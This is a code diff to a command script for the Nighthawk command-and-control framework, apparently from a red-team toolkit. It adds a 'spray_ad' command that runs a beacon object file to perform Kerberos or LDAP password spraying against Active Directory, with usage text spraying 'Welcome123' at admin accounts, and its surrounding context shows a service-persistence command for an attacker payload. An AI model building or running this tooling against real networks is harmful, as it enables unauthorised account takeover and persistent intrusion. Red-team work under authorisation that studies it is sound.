@@ -75,7 +75,7 @@ def base_execute_bof(bof_name: str, bof_bin_path: str, save_to_file: str, output
     with open(nighthawk.script_resource(f"{bof_bin_path}.{info.Agent.ProcessArch}.o"), 'rb') as f:
         bof = f.read()
     bin_name = bof_bin_path.rsplit("/", 1)[-1]
-    nighthawk.console_write(CONSOLE_INFO, f"executing {bof_name} BOF")
+    nighthawk.console_write(CONSOLE_INFO, f"Executing {bof_name} BOF")
     notification = api.execute_bof(f"{bin_name}.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, technique, sync=True)
     write_output(notification, save_to_file, output_to_console, open_in_notepad)
     nighthawk.console_write(CONSOLE_INFO, f"Finished executing {bof_name} BOF")
@@ -1562,6 +1562,53 @@ Usage:   persist_service <SERVICE_BINARY_ON_ATTACKER_COMPUTER>
 Example: persist_service C:\\Payload\\agent-svc.exe
     THIS IS AN AVANTGUARD SCRIPT""",
     "persist_service"
+)
+
+# endregion
+
+# region SprayAD
+
+def spray_ad(params, info):
+    """
+    Perform password spraying in AD domain
+    """
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) <  1:
+        nighthawk.console_write(CONSOLE_ERROR, "Too few arguments passed to SprayAD! Please enter the password to spray")
+        return False
+
+    password = command_params[0]
+    username_filter = ""
+    use_ldap = ""
+    for val in command_params[1:]:
+        if val == "--ldap":
+            use_ldap = "ldap"
+        elif username_filter == "":
+            username_filter = val
+        else:
+            break
+
+    packed_params = pack_params(f"Z{password}", f"Z{username_filter}", f"Z{use_ldap}")
+    if type(packed_params) != bytes:
+        return False
+
+    base_execute_bof("spray_ad", "bin/SprayAD/SprayAD", save_to_file, output_to_console, open_in_notepad, packed_params, info)
+
+nighthawk.register_command(
+    spray_ad,
+    "spray_ad",
+    "BOF - Perform a Kerberos or LDAP password spraying attack against Active Directory (avantguard script)",
+    "BOF - Perform a Kerberos or LDAP password spraying attack against Active Directory (avantguard script)",
+    """spray_ad
+Summary: Perform a Kerberos or LDAP password spraying attack against Active Directory.
+Usage:   spray_ad <PASSWORD> <OPT:USERNAME_FILTER> <OPT:--ldap>
+         PASSWORD         Required. The password to spray.
+         USERNAME_FITLER  Username filter to use, e.g. admin* (default is *).
+         --ldap           Use LDAP instead of Kerberos.
+
+Example: spray_ad Welcome123 admin*
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "spray_ad"
 )
 
 # endregion
